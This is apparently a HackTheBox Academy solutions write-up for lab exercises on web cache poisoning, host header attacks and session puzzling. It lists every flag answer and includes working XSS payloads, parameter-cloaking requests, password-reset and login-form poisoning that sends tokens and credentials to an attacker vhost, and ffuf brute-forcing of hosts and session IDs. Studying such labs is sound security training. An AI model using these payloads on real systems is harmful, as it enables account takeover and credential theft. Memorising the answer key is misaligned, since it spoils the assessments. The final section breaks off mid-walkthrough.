| Section                                     | Question Number | Answer                                |
| ------------------------------------------- | --------------- | ------------------------------------- |
| Identifying Unkeyed Parameters              | Question 1      | HTB{38eb00cfc8f39eedb3d4fbe4e56512c5} |
| Advanced Cache Poisoning Techniques         | Question 1      | HTB{6f4c51837d8148cb8dc66beb14003706} |
| Advanced Cache Poisoning Techniques         | Question 2      | HTB{cac766b823bbd388727162d634fa7503} |
| Tools & Prevention                          | Question 1      | X-Filename                            |
| Authentication Bypass                       | Question 1      | HTB{2454563555ed26dd9ae4bc005393a646} |
| Password Reset Poisoning                    | Question 1      | HTB{532e5166a6018a17bbc2d3b6db3e7015} |
| Web Cache Poisoning                         | Question 1      | HTB{ad509fff66f755b8137e365e3f8f5568} |
| Bypassing Flawed Validation                 | Question 1      | HTB{59571d51f0dbf17445404767729f5771} |
| Weak Session IDs                            | Question 1      | HTB{cc5e1efbb4e786b59684b83a370e191e} |
| Common Session Variables (Auth Bypass)      | Question 1      | HTB{45a12ce9dfef6556925462060658f517} |
| Premature Session Population (Auth Bypass)  | Question 1      | HTB{8dbe81b79929b3ce8b1b3abc3592a483} |
| Common Session Variables (Account Takeover) | Question 1      | HTB{ad5ff3838cfce1e2476e18bc8562c6ba} |
| Skills Assessment - Easy                    | Question 1      | HTB{2667bd49fe5ba0efbff46ec060411822} |
| Skills Assessment - Hard                    | Question 1      | HTB{28b4584a8f1bb666d8e5a9250b535977} |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Identifying Unkeyed Parameters

## Question 1

### "Try to use what you learned in this section to poison the cache and force the admin user to reveal the flag. NOTE: The lab may take a couple of minutes to start up. The cache expires after 2 minutes, so if you accidentally cached an incorrect payload, wait for 2 minutes until the cache expires."

After spawning the target machine and visiting the root webpage of its website, students first need to identify unkeyed parameters of the GET request to `/index.php` to poison the cache; after refreshing the root webpage and intercepting the GET request with `Burp Suite`, students will notice that the `X-Cache-Status` header has the value `HIT`, and then when using another value ("de" used in here), the value becomes a `MISS`, indicating that the "language" GET parameter is keyed:

![[HTB Solutions/CWEE/z. images/00b504f06672ec67c7316c02c64ea850_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/c8b878b42031400b0f5c6e1c9e22203e_MD5.jpg]]

However, when trying to set new embedded content and intercepting the request, students will notice that the "content" GET parameter is being utilized:

![[HTB Solutions/CWEE/z. images/2f8219d3379cc8d6b416404fb1ab939f_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/34af7e12b02ce53bd92fe288ca77bec6_MD5.jpg]]

Therefore, students need to test if the "content" parameter is keyed or not. To do so, students need to use unique values (i.e., `Cache Busters`) for the "content" and "language" GET parameters, attaining `MISS` for the value of `X-Cache-Status`:

![[HTB Solutions/CWEE/z. images/bd10515f64ca9caf629ac698e5b868f1_MD5.jpg]]

After sending it again, the value becomes `HIT`:

![[HTB Solutions/CWEE/z. images/da98943685c90f13a43e8e6a8f7d4f37_MD5.jpg]]

However, when keeping the same value for "language" and changing "content", the value remains to be `HIT`, therefore, "content" is an unkeyed parameter:

![[HTB Solutions/CWEE/z. images/52094b9f475b3e039bdecdc17d3f785e_MD5.jpg]]

After determining that the GET parameter "content" is unkeyed, students need to determine whether it can be used as an attack vector for another vulnerability. Students will notice that there is no sanitisation performed on the front-end; this parameter suffers from a `reflected XSS` vulnerability:

![[HTB Solutions/CWEE/z. images/49a18a799feb2cff37908389b8802e45_MD5.jpg]]

When reading the question's hint, students will come to know that the admin accesses the URL `/index.php?language=de`, therefore, students need to poison the cache by making the admin request `/admin.php?reveal_flag=1`, as this is the endpoint invoked when intercepting the request sent when clicking on "Reveal Flag" in `/flag.php`:

![[HTB Solutions/CWEE/z. images/59b0aca4db6a5779465eab73c932d989_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/d4f6c6bd5fa10d99c425da7246283828_MD5.jpg]]

Students need to use the same `JavaScript` payload provided in the section:

Code: js

```js
<script>var xhr=new XMLHttpRequest();xhr.open('GET', '/admin.php?reveal_flag=1', true);xhr.withCredentials=true;xhr.send();</script>
```

Code: js

```js
"><script>var xhr=new XMLHttpRequest();xhr.open('GET', '/admin.php?reveal_flag=1', true);xhr.withCredentials=true;xhr.send();</script>
```

Students need to URL-encode the payload:

Code: js

```js
%22%3E%3Cscript%3Evar%20xhr=new%20XMLHttpRequest();xhr.open('GET',%20'/admin.php?reveal_flag=1',%20true);xhr.withCredentials=true;xhr.send();%3C/script%3E
```

The "language" parameter needs to be set to `de` while the "content" parameter needs to be set to the XSS payload:

![[HTB Solutions/CWEE/z. images/58fea608f0da6141bd9dde43b0b9cced_MD5.jpg]]

After waiting for a few seconds and then visiting `/flag.php`, students will notice that the admin have triggered the XSS injection payload, revealing the flag `HTB{38eb00cfc8f39eedb3d4fbe4e56512c5}`:

![[HTB Solutions/CWEE/z. images/425ab985a7d791a1dddc2fc36c2f4a1f_MD5.jpg]]

Answer: `HTB{38eb00cfc8f39eedb3d4fbe4e56512c5}`

# Advanced Cache Poisoning Techniques

## Question 1

### "Try to use what you learned in this section to exploit fat GET requests on the vhost fatget.wcp.htb to poison the cache and force the admin user to reveal the flag. NOTE: The lab may take a couple of minutes to start up. The cache expires after 2 minutes, so if you accidentally cached an incorrect payload, wait for 2 minutes until the cache expires."

After spawning the target machine, students first need to add the `fatget.wcp.htb` vHost entry into `/etc/hosts`:

Code: shell

```shell
sudo sh -c 'echo "STMIP fatget.wcp.htb" >> /etc/hosts'
```

```
┌─[us-academy-2]─[10.10.14.212]─[htb-ac413848@htb-kj54nnus81]─[~]
└──╼ [★]$ sudo sh -c 'echo "138.68.160.5 fatget.wcp.htb" >> /etc/hosts'
```

When navigating to the website's root webpage, it is important that students include the port number after the domain name:

![[HTB Solutions/CWEE/z. images/5017c912f25f6d31c3976d4cd54d8cde_MD5.jpg]]

Subsequently, students need to intercept the request sent to the root webpage and test if the webserver is misconfigured to accept fat GET requests; when setting the GET "language" parameter to `en` and the body "language" parameter to `de`, students will notice that response contains a German version of Lorem Ipsum, indicating that not only the webserver is misconfigured to accept fat GET requests, but also prefers the value of the body parameters over the value of the URL parameters:

![[HTB Solutions/CWEE/z. images/7a76a54f8a63a844e15d172d9457f487_MD5.jpg]]

Now that the cache is poisoned to return German text when requesting for English content, students need to remove the body parameter to deduce if there is discrepancy between the response of the cache and the webserver; students will notice that indeed there is a discrepancy since a German Lorem Ipsum has been returned when requesting for English content:

![[HTB Solutions/CWEE/z. images/38753d6d53cd53bdf5517fc2f1020263_MD5.jpg]]

From the previous question, students know that the "content" GET parameter is vulnerable to `reflective XSS`, however, when trying to inject into it the same payload that forces the admin to reveal the flag, they will notice that it is sanitized:

Code: js

```js
<script>var xhr=new XMLHttpRequest();xhr.open('GET', '/admin.php?reveal_flag=1', true);xhr.withCredentials=true;xhr.send();</script>
```

Code: js

```js
"><script>var xhr=new XMLHttpRequest();xhr.open('GET', '/admin.php?reveal_flag=1', true);xhr.withCredentials=true;xhr.send();</script>
```

Students need to URL-encode the payload:

Code: js

```js
%22%3E%3Cscript%3Evar%20xhr=new%20XMLHttpRequest();xhr.open('GET',%20'/admin.php?reveal_flag=1',%20true);xhr.withCredentials=true;xhr.send();%3C/script%3E
```

![[HTB Solutions/CWEE/z. images/2cb07d9becf1c21a051270a9e8f1ed4d_MD5.jpg]]

Thus, students need to poison the cache for the German content (i.e. via the GET URL-parameter `/index.php?language=de`) since the admin visits that webpage, making the body GET parameter "language" hold the reflective XSS payload:

![[HTB Solutions/CWEE/z. images/b9eaf83d60b66ffd3b5384b4adc9933e_MD5.jpg]]

After waiting for a few seconds, students will notice that the admin has triggered the XSS payload, as the `/flag.php` page displays the flag `HTB{6f4c51837d8148cb8dc66beb14003706}`:

![[HTB Solutions/CWEE/z. images/1fd034ff6227bfeffc9ad7ea8778ed97_MD5.jpg]]

Answer: `HTB{6f4c51837d8148cb8dc66beb14003706}`

# Advanced Cache Poisoning Techniques

## Question 2

### "Try to use what you learned in this section to exploit parameter cloaking on the vhost cloak.wcp.htb to poison the cache and force the admin user to reveal the flag. NOTE: The lab may take a couple of minutes to start up. The cache expires after 2 minutes, so if you accidentally cached an incorrect payload, wait for 2 minutes until the cache expires."

After spawning the target machine, students first need to add the `cloak.wcp.htb` vHost into `/etc/hosts`:

Code: shell

```shell
sudo sh -c 'echo "STMIP cloak.wcp.htb" >> /etc/hosts'
```

```
┌─[us-academy-2]─[10.10.14.212]─[htb-ac413848@htb-kj54nnus81]─[~]
└──╼ [★]$ sudo sh -c 'echo "138.68.160.5 cloak.wcp.htb" >> /etc/hosts'
```

When navigating to the website's root webpage, it is important that students include the port number after the domain name; students will notice that the webpage states it is now using the `Bottle` Python framework, thus, students need to test if it is vulnerable to [CVE-2020-28473](https://nvd.nist.gov/vuln/detail/CVE-2020-28473):

![[HTB Solutions/CWEE/z. images/79849e6576884484cb553c5af454e61b_MD5.jpg]]

When trying to poison the cache using the `Parameter Cloaking` technique by setting the first "language" GET parameter to English while the last to be German (the "a" parameter is assumed to be unkeyed as taught in the module's section), the latter is returned (since `Bottle` prefers the last occurrence of each parameter):

Code: http

```http
GET /?language=en&a=b;language=de HTTP/1.1
```

![[HTB Solutions/CWEE/z. images/55af396393539f28d86e12e82739034e_MD5.jpg]]

Students then need to confirm that the cache has been poisoned by requesting English content but attaining German in the response:

![[HTB Solutions/CWEE/z. images/f5f3b2c31b2f057f2aaecab5da183494_MD5.jpg]]

Students now need to poison the web cache to force the admin into revealing the flag by visiting `/admin?reveal_flag=1`; students need to make sure that they remove the ".php" extension after the webpages name since this is `Bottle`:

Code: js

```js
<script>var xhr=new XMLHttpRequest();xhr.open('GET', '/admin?reveal_flag=1', true);xhr.withCredentials=true;xhr.send();</script>
```

Code: js

```js
"><script>var xhr=new XMLHttpRequest();xhr.open('GET', '/admin?reveal_flag=1', true);xhr.withCredentials=true;xhr.send();</script>
```

Students need to URL-encode the payload, making sure that all semi-colons are URL-encoded as they are the separation character in `Bottle`:

Code: js

```js
%22%3E%3Cscript%3Evar%20xhr=new%20XMLHttpRequest();xhr.open('GET',%20'/admin?reveal_flag=1',%20true);xhr.withCredentials=true;xhr.send();%3C/script%3E
```

The payload will be injected in the latter "language" parameter, as it suffers from a reflective XSS vulnerability:

Code: http

```http
GET /?language=de&a=b;language=%22%3E%3Cscript%3Evar%20xhr=new%20XMLHttpRequest()%3bxhr.open('GET',%20'/admin?reveal_flag=1',%20true)%3bxhr.withCredentials=true%3bxhr.send()%3b%3C/script%3E HTTP/1.1
```

![[HTB Solutions/CWEE/z. images/c8f0b4fe3f1e39729416371f83c3d2e4_MD5.jpg]]

After waiting for a few seconds, students will notice that the admin has triggered the XSS payload, as the `/flag` page displays the flag `HTB{cac766b823bbd388727162d634fa7503}`:

![[HTB Solutions/CWEE/z. images/725820e9a93fd6a13a424d253cc7db8a_MD5.jpg]]

Answer: `HTB{cac766b823bbd388727162d634fa7503}`

# Tools & Prevention

## Question 1

### "Use WCVS to identify an HTTP header vulnerable to web cache poisoning in the provided web application."

After spawning the target machine, students first need to download [Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) using `go`:

Code: shell

```shell
go install github.com/Hackmanit/Web-Cache-Vulnerability-Scanner/v2@latest
```

```
┌─[us-academy-1]─[10.10.15.9]─[htb-ac-413848@htb-ucupdcvxyg]─[~]
└──╼ [★]$ go install github.com/Hackmanit/Web-Cache-Vulnerability-Scanner/v2@latest

go: downloading github.com/Hackmanit/Web-Cache-Vulnerability-Scanner v0.0.0-20240320081034-08865ff21dd8
go: downloading github.com/Hackmanit/Web-Cache-Vulnerability-Scanner/v2 v2.0.0-20211027074849-fadf73ee337c
go: downloading golang.org/x/net v0.0.0-20211020060615-d418f374d309
go: downloading golang.org/x/time v0.0.0-20210723032227-1f47c861a9ac
go: downloading golang.org/x/text v0.3.7
```

Subsequently, students need to run the `Web-Cache-Vulnerability-Scanner` binary (found within the 'go/bin/' directory) on the spawned target machine, specifying the "language" GET parameter with the `-sp` flag (the `-gr` flag can be omitted in case students don't want `Web-Cache-Vulnerability-Scanner` to generate a report of its findings); students will find that the `X-Filename` header is vulnerable to web cache poisoning:

Code: shell

```shell
./go/bin/Web-Cache-Vulnerability-Scanner -u http://STMIP:STMPO/ -sp language=en -gr
```

```
┌─[us-academy-1]─[10.10.15.9]─[htb-ac-413848@htb-ucupdcvxyg]─[~]
└──╼ [★]$ ./go/bin/Web-Cache-Vulnerability-Scanner -u http://94.237.54.170:56841/ -sp language=en -gr

WCVS v1.0.0 started at 2024-04-28_08-42-27
Exported report ./2024-04-28_08-42-27_WCVS_Report.json
Testing website(1/1): http://94.237.54.170:56841/
-----------------------------------------------------------------------
X-Cache header was found: [HIT] 
Parameter cb as Cachebuster was successful (Parameter)
The default status code was set to 200

<SNIP>
header X-Filename: Response Body contained 675339949003
------- Header X-Filename was successfully poisoned!!! cb: 252832834561 poison: 675339949003 -------
URL: http://94.237.54.170:56841/?language=en&cb=252832834561
Reason: Response Body contained 675339949003

<SNIP>
```

Answer: `X-Filename`

# Authentication Bypass

## Question 1

### "Try to use what you learned in this section to bypass the authentication check via host header manipulation and obtain the flag."

After spawning the target machine and trying to access `/admin.php`, students will notice that the webpage states "The admin area can only be accessed locally!":

![[HTB Solutions/CWEE/z. images/6b50e188ed37160a42230980d5026337_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/03a14f60a71e3071e79060b19824a61b_MD5.jpg]]

When intercepting the request and altering the `Host` header to be `localhost` or `127.0.0.1`, students will still be not able to access the admin panel, therefore, they need to create a wordlist of the private IP address range `192.168.0.0-192.168.255.255` to subsequently use it in fuzzing a valid `Host` header value:

Code: bash

```bash
for octet3 in {1..255};do
for octet4 in {1..255};do
echo "192.168.$octet3.$octet4" >> privateClassCIPs.txt
done
done
```

```
┌─[us-academy-2]─[10.10.14.212]─[htb-ac413848@htb-isi63lgnvk]─[~]
└──╼ [★]$ for octet3 in {1..255};do
> for octet4 in {1..255};do
> echo "192.168.$octet3.$octet4" >> privateClassCIPs.txt
> done
> done
```

Then, students need to use `Ffuf` to test which IP address(es) will authenticate, filtering out any response with the size 752 (as it is the response size returned for any erroneous request). Three IP addresses will authenticate successfully and bypasses the restriction/validation put forth by the web application, which are `192.168.178.82`, `192.168.178.132`, and `192.168.178.219`:

Code: shell

```shell
ffuf -u http://STMIP:STMPO/admin.php -w privateClassCIPs.txt -H "Host: FUZZ" -fs 752
```

```
┌─[us-academy-2]─[10.10.14.212]─[htb-ac413848@htb-isi63lgnvk]─[~]
└──╼ [★]$ ffuf -u http://178.62.24.63:31544/admin.php -w privateClassCIPs.txt -H "Host: FUZZ" -fs 752

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://178.62.24.63:31544/admin.php
 :: Wordlist         : FUZZ: privateClassCIPs.txt
 :: Header           : Host: FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 752
________________________________________________

192.168.178.82          [Status: 200, Size: 775, Words: 49, Lines: 36, Duration: 14ms]
192.168.178.132         [Status: 200, Size: 775, Words: 49, Lines: 36, Duration: 14ms]
192.168.178.219         [Status: 200, Size: 775, Words: 49, Lines: 36, Duration: 13ms]
:: Progress: [65025/65025] :: Job [1/1] :: 2440 req/sec :: Duration: [0:00:43] :: Errors: 0 ::
```

Students can use any of the three IP addresses as the value of the `Host` header (the first will be used in here), attaining the flag `HTB{2454563555ed26dd9ae4bc005393a646}`:

![[HTB Solutions/CWEE/z. images/c65f1cba02f94391e01848d2122587ae_MD5.jpg]]

Answer: `HTB{2454563555ed26dd9ae4bc005393a646}`

# Password Reset Poisoning

## Question 1

### "Try to use what you learned in this section to exploit password reset poisoning and take over the admin account to obtain the flag. The admin user's email address is admin@httpattacks.htb. NOTE: Use the local vhost interactsh.local to exfiltrate data."

After spawning the target machine, students first need to add the vHost entry `interactsh.local` to `/etc/hosts`:

Code: shell

```shell
sudo sh -c 'echo "STMIP interactsh.local" >> /etc/hosts'
```

```
┌─[us-academy-2]─[10.10.14.212]─[htb-ac413848@htb-xbcoapcfaa]─[~]
└──╼ [★]$ sudo sh -c 'echo "161.35.166.184 interactsh.local" >> /etc/hosts'
```

Subsequently, students need to visit the `/login.php` webpage of the spawned target machine web application and click on `Forgot Password?`:

![[HTB Solutions/CWEE/z. images/8804765d7ea9a1c1074541be36c42513_MD5.jpg]]

Students need to use the email address of the admin `admin@httpattacks.htb` and intercept the request with `Burp Suite`:

![[HTB Solutions/CWEE/z. images/9505ca2228851043cdfaeb99b0f141f9_MD5.jpg]]

When keeping the default `Host` header and assigning it the value `interactsh.local`, students will notice that there are no password reset tokens received from the admin in `http://interactsh.local:STMPO/log`, therefore, students need to use the `Override Header` `X-Forwarded-Host`, specifying `interactsh.local` as its value:

![[HTB Solutions/CWEE/z. images/52e10621af64d5bcccfef5023b08a95a_MD5.jpg]]

Subsequently, when checking the logs over `http://interactsh.local:STMPO/log`, students will find that the admin has requested a password reset with the token `d3da381910d8daab0ae852cb6441aa8e`:

![[HTB Solutions/CWEE/z. images/774710a084fc3c96a171b556c08dd3f9_MD5.jpg]]

Therefore, students need to copy the entire path (i.e., `/pw_reset.ph?token=d3da381910d8daab0ae852cb6441aa8e`) and visit it to change the password of the admin. It is always a good practice to use cryptographically secure passwords to prevent other threat agents from gaining access, to do so, students can use `openssl`:

Code: shell

```shell
openssl rand -hex 16
```

```
┌─[us-academy-2]─[10.10.14.212]─[htb-ac413848@htb-xbcoapcfaa]─[~]
└──╼ [★]$ openssl rand -hex 16

423040bdf58c666a9a0292ce01c9147c
```

![[HTB Solutions/CWEE/z. images/2de0a484a5916bea137ca88bf036bfb4_MD5.jpg]]

After signing in, students will attain the flag `HTB{532e5166a6018a17bbc2d3b6db3e7015}`:

![[HTB Solutions/CWEE/z. images/4c606fa821b8316a090db9bd58dff118_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/6ae1f9ffe2d49dcb03377207b5989c40_MD5.jpg]]

Answer: `HTB{532e5166a6018a17bbc2d3b6db3e7015}`

# Web Cache Poisoning

## Question 1

### "Try to use what you learned in this section to poison the cache and obtain the admin user's password. NOTE: The lab may take a couple of minutes to start up. Use the local vhost interactsh.local to exfiltrate data (refer to the Password Reset Poisoning section for more details). The cache expires after 2 minutes, so if you accidentally cached an incorrect payload, wait for 2 minutes until the cache expires."

After spawning the target machine, students first need to add the vHost entries `admin.hostheaders.htb` and `interactsh.local` to `/etc/hosts`:

Code: shell

```shell
sudo sh -c 'echo "STMIP admin.hostheaders.htb interactsh.local">> /etc/hosts'
```

```
┌─[us-academy-2]─[10.10.14.242]─[htb-ac413848@htb-yy7vgeewfb]─[~]
└──╼ [★]$ sudo sh -c 'echo "178.128.160.182 admin.hostheaders.htb interactsh.local">> /etc/hosts'
```

Subsequently, students need to visit the web application of the spawned target machine and inspect it, finding it using the `Host` header value to construct absolute links:

![[HTB Solutions/CWEE/z. images/7f5fe63b9d8d5fd9268d2c08bfe17d6d_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/47bbf044c6838da45bc54e208e19ed48_MD5.jpg]]

When intercepting the request to `/login.php` and changing the `Host` header to be any arbitrary value, students will notice that web application uses that value for constructing absolute links, and most importantly, for the action of the login form:

![[HTB Solutions/CWEE/z. images/7b12e40cf58008dd77c60dacfc011f98_MD5.jpg]]

After intercepting the GET request to `/login.php` (it is important that the POST request to `/login.php` is not the one being poisoned as that will fail), students need to exploit this misconfiguration by utilizing the `Override Header` `X-Host` (any other `Override Header` will not work, as the web server does not support them) and make it send the login credentials to `interactsh.local`:

![[HTB Solutions/CWEE/z. images/dd3730c249edc4b774cac4795f186dfb_MD5.jpg]]

After waiting for a few seconds, students need to check the log over `http://interactsh.local:STMPO/log`, finding the URL-encoded password `HTB{ad509fff66f755b8137e365e3f8f5568}`:

![[HTB Solutions/CWEE/z. images/7a3d1da08e0134c681283f2012e35c04_MD5.jpg]]

Answer: `HTB{ad509fff66f755b8137e365e3f8f5568}`

# Bypassing Flawed Validation

## Question 1

### "Try to use what you learned in this section to bypass the authentication check via host header manipulation and obtain the flag."

After spawning the target machine and trying to access `/admin.php` (by clicking on "Admin Area"), students will notice that the webpage states "The admin area can only be accessed locally!":

![[HTB Solutions/CWEE/z. images/304df70f70ae20ae41164c6cd594f78d_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/c6227e48a0fbfea703dbd1fc9fb58a5b_MD5.jpg]]

Therefore, students need to intercept the request sent to the `/admin.php` webpage and change the `Host` header to a value like `localhost`; the response attained indicates that there is validation performed on the `Host` header value:

![[HTB Solutions/CWEE/z. images/f3ec284060c2ad3fb0d7288cf00589b1_MD5.jpg]]

However, when trying a value such as `localhosT`, the flawed validation is bypassed, attaining the flag `HTB{59571d51f0dbf17445404767729f5771}`:

![[HTB Solutions/CWEE/z. images/561897d98b20ba4b2d6120a22e972433_MD5.jpg]]

Additionally, students can utilize the `Override Header` `X-Forwarded-Host` and specify `127.1` as the value (in this case, the `Host` header's value does not matter (as it is overridden) and therefore can be any arbitrary value):

![[HTB Solutions/CWEE/z. images/dd4cdf7a036495c212f4ad2eb35e19e1_MD5.jpg]]

Answer: `HTB{59571d51f0dbf17445404767729f5771}`

# Weak Session IDs

## Question 1

### "Try to use what you learned in this section to obtain the admin user's active session and take over the account to obtain the flag."

After spawning the target machine and visiting its website's root webpage, students need to sign in with the credentials `htb-stdnt:Academy_student!`:

![[HTB Solutions/CWEE/z. images/14cc4ac2f31ac331e641941ea9ac8f15_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/43b1b899e601a59cdd966fd27d77a188_MD5.jpg]]

Subsequently, when refreshing the webpage and intercepting the request, students will notice that the value of the session cookie is only 4 characters long, in addition to only containing lowercase letters and digits:

![[HTB Solutions/CWEE/z. images/daf0d429f4cf90de59b78062feaf9444_MD5.jpg]]

Since the session cookie is short and not cryptographically secure, students need to brute force the IDs of other valid sessions. To do so, students first need to create a wordlist with `crunch`:

Code: shell

```shell
crunch 4 4 "abcdefghijklmnopqrstuvwxyz1234567890" -o sessions.txt
```

```
┌─[us-academy-2]─[10.10.14.242]─[htb-ac413848@htb-ajgzo6jft4]─[~]
└──╼ [★]$ crunch 4 4 "abcdefghijklmnopqrstuvwxyz1234567890" -o sessions.txt

Crunch will now generate the following amount of data: 8398080 bytes
8 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 1679616 

crunch: 100% completed generating output
```

Then, students need to run `Ffuf`, using the `-b` flag to specify the cookie and `automatic calibration` with the `-ac` flag; students will find that the session ID `b2sx` is a valid session ID:

Code: shell

```shell
ffuf -u http://STMIP:STMPO/profile.php -b "sessionID=FUZZ" -w sessions.txt -ac
```

```
┌─[us-academy-2]─[10.10.14.242]─[htb-ac413848@htb-ajgzo6jft4]─[~]
└──╼ [★]$ ffuf -u http://188.166.171.51:30355/profile.php -b "sessionID=FUZZ" -w sessions.txt -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://188.166.171.51:30355/profile.php
 :: Wordlist         : FUZZ: sessions.txt
 :: Header           : Cookie: sessionID=FUZZ
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response words: 1
________________________________________________

b2sx                    [Status: 200, Size: 2262, Words: 497, Lines: 67, Duration: 94ms]
```

Therefore, students need to use the session ID `b2sx` found by `Ffuf`, to attain the flag `HTB{cc5e1efbb4e786b59684b83a370e191e}`:

![[HTB Solutions/CWEE/z. images/4e37188ef800d586414164a6f89d5b34_MD5.jpg]]

Answer: `HTB{cc5e1efbb4e786b59684b83a370e191e}`

# Common Session Variables (Auth Bypass)

## Question 1

### "Try to use what you learned in this section to exploit a session puzzling vulnerability due to common session variables and bypass authentication to log in as the admin user and obtain the flag."

After spawning the target machine and navigating to `/login.php`, students first need to sign in with the credentials `htb-stdnt:Academy_student!`, to notice that a successful login redirects to `/profile.php`:

![[HTB Solutions/CWEE/z. images/87f49fd12eaf08a8300ef1075b09569f_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/ae535d4ead8d485f44799ba4ed1d4cb3_MD5.jpg]]

Subsequently, students need to log out and click on `Register new User`:

![[HTB Solutions/CWEE/z. images/b8eb7b4e3662eae4d0c41735d0a493fd_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/e9bf74258536da94d15c758147a12d7c_MD5.jpg]]

Students need to use the `admin` username and click on `Register`:

![[HTB Solutions/CWEE/z. images/336d0eec13c13fad4cb1726c8be04780_MD5.jpg]]

In phase 2 of the process, students will be prompted to confirm the registration. However, this is to be avoided as the username `admin` is already taken. Instead, students need to navigate to `/profile.php`, in an attempt to exploit a common session variable between phase 1 of registering and `/profile.php`, as it will hold the username `admin`:

![[HTB Solutions/CWEE/z. images/15d691380dbe55e3a17297f4a4e915a1_MD5.jpg]]

When not confirming the registration but instead navigating to `/profile.php`, students will attain the flag `HTB{45a12ce9dfef6556925462060658f517}`:

![[HTB Solutions/CWEE/z. images/f0a172c7d1c7ab8d3138edd5691c52de_MD5.jpg]]

Answer: `HTB{45a12ce9dfef6556925462060658f517}`

# Premature Session Population (Auth Bypass)

## Question 1

### "Try to use what you learned in this section to exploit a session puzzling vulnerability due to premature session population and bypass authentication to log in as the admin user and obtain the flag."

After spawning the target machine and navigating to `/login.php`, students first need to understand the flow of a successful sign-in by signing in with the credentials `htb-stdnt:Academy_student!`, to notice that a successful login redirects to `/login.php?success=1`:

![[HTB Solutions/CWEE/z. images/f745e5f1ce3d58fb08150a5b4d5732c9_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/f2560059d5f7ad3d98478c0d5d93896d_MD5.jpg]]

Students need to sign out then attempt a failed login with the username `admin` and intercept the request:

![[HTB Solutions/CWEE/z. images/d606ab1781eddf869e79610c4bf3887b_MD5.jpg]]

After sending the request, students will notice that the redirection location is `login.php?failed=1`:

![[HTB Solutions/CWEE/z. images/cdebeb4b9291d279df92138d273bdc41_MD5.jpg]]

Students need not follow the original redirection but instead change the request method to GET and the URL being `/login.php?success=1`, in an attempt to exploit a premature session population of the username `admin` by `/login.php`. After sending the modified request, students will notice that the new redirection location is `profile.php`, therefore they need to follow the redirection this time:

![[HTB Solutions/CWEE/z. images/6c9673b22d5ec4658ee90ebd34a91466_MD5.jpg]]

Subsequently, students will attain the flag `HTB{8dbe81b79929b3ce8b1b3abc3592a483}` in `/profile.php`:

![[HTB Solutions/CWEE/z. images/c6270f259d3333262dd1a516165b4add_MD5.jpg]]

Answer: `HTB{8dbe81b79929b3ce8b1b3abc3592a483}`

# Common Session Variables (Account Takeover)

## Question 1

### "Try to use what you learned in this section to exploit a session puzzling vulnerability due to common session variables and take over the admin account to obtain the flag."

After spawning the target machine and visiting its website's root webpage, students first need to understand the flow of a successful login; using the credentials `htb-stdnt:Academy_student!`, students need to sign in and intercept the request:

![[HTB Solutions/CWEE/z. images/52f53cba99b59c179646ad253bb403e0_MD5.jpg]]

Students will notice that a successful login redirects to `profile.php`:

![[HTB Solutions/CWEE/z. images/9f7f0bf4f8641d58f99d41b06b148fe7_MD5.jpg]]

Following the redirection, students will see a GET request to `login.php`:

![[HTB Solutions/CWEE/z. images/cfc35e5cb3081bdd84ee9e6648e9d77a_MD5.jpg]]

After understanding the flow of a successful login, students need to test the `Register new User` and `Forgot Password?` processes, finding each consisting of three phases. Students need to finish the first two phases of `Register new User` and then skip directly to phase 3 of `Forgot Password?`:

![[HTB Solutions/CWEE/z. images/63e625ff24f04556c84d45eb77bf2428_MD5.jpg]]

Students need to carry out the two processes simultaneously (finishing the first two phases of `Register new User` without first finishing the first phase of `Forgot Password?` will render the attack useless), in one tab, `Register new User` needs to be opened:

![[HTB Solutions/CWEE/z. images/cb66e29ce5864e0bf42ee758793ca9db_MD5.jpg]]

While in another tab, `Forgot Password?` needs to be open:

![[HTB Solutions/CWEE/z. images/56b26818288280932205b544e592fd4e_MD5.jpg]]

In `Forgot Password?`, students need to carry out the first phase by supplying `admin` for the username:

![[HTB Solutions/CWEE/z. images/faad2e5c2108009d7faf1dae5adff922_MD5.jpg]]

For phase 2, the name of the admin's first pet is not known, therefore, students need to move to the `Register new User` tab/process in an attempt of exploiting common session variables that use the same phase variable:

![[HTB Solutions/CWEE/z. images/d00c9b7dae70d7b7d96ae95ff572b2c2_MD5.jpg]]

This vulnerable web application uses the same session variable for "phases" from the register page, thus, students need to go to the register process and complete until phase 3, providing the username `admin` when registering (other fields can be any dummy data):

![[HTB Solutions/CWEE/z. images/502f7d3aaec9d97b0aa9e203dfe8ba97_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/2bd16a349fb74d715730b28894a631dc_MD5.jpg]]

